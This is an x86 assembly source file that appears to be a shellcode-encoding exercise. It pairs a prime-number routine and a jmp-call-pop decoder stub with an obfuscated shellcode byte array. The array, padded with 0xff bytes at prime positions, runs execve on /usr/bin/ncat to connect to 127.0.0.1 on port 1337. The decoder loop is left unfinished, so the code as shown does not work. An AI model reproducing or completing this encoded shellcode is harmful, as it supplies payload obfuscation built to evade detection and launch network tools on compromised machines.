; Author: @bugsam
; Date:

global _start

section .text
; return EAX -> 0x01, if a prime number
; return EAX -> 0xff, if a compositive number

IsPrime:
        push ebp
        mov ebp, esp
        sub esp, 0x10

        cmp ecx, 0x01
        jng ..@false            ; jump if ECX <= 0x01

        mov esi, 0x01           ; [ESI] range from 1 to ECX
        push ecx                ; [esp+4]
        xor edx, edx            ; clear register
        xor edi, edi

        ..@loopPrime:
                push ecx        ; save registers as it is the counter

                mov ax, [esp+4] ; AX <- suppose prime number (dividend)
                div si          ; AX/SI
                cmp dl, dh      ; remainder equals zero
                setz bl
                add edi, ebx 
                xor edx, edx
                xor ebx, ebx
                inc si          ; increments divisor

                pop ecx         ; restore the counter to be decreased
                loop ..@loopPrime

                cmp edi, 0x02   ; greater than 0x02 is compositive number
                jg ..@false
                mov eax, 0x01   ; returns as a prime number
                jmp ..@ends

        ..@false:
                mov eax, 0xff   ; returns as a compositive number

        ..@ends:
                leave
                ret

_start:
        jmp short payload

decoder:
        pop esi

        mov cl, 0x48
        mov eax, 0x01
..@rangeNumber:
        push ecx
        push eax

        mov ecx, eax
        call IsPrime
        ; do something with return ;mov ecx, [esi+ecx] value to clean
        pop eax
        inc eax
        pop ecx
        loop ..@rangeNumber


payload: 
        call decoder
; 72 bytes 0x48 (before insertion)
; 92 bytes 0x5c (after insertion) 
; simple ncat stream, not reverse ou bind shell
shell: db 0x31,0xc0,0xff,0x50,0xff,0x68,0x31,0xff,0x33,0x33,0xff,0x37,0x89,0xe2,0x50,0xff,0x68,0x30,0xff,0x2e,0x30,0x31,0x68,0xff,0x30,0x30,0xff,0x2e,0x30,0x68,0x31,0xff,0x32,0x37,0x2e,0x89,0xe1,0x50,0xff,0x68,0x6e,0xff,0x63,0x61,0x74,0x89,0xe3,0x50,0xff,0x89,0xe0,0x52,0x89,0xff,0xc2,0x51,0xff,0x53,0x89,0xe1,0x31,0xff,0xc0,0x50,0x68,0x6e,0x2f,0x6e,0xff,0x63,0x68,0x72,0x2f,0x62,0x69,0xff,0x68,0x2f,0xff,0x2f,0x75,0x73,0x89,0xe3,0x31,0xff,0xc0,0xb0,0x0b,0xcd,0xff,0x80
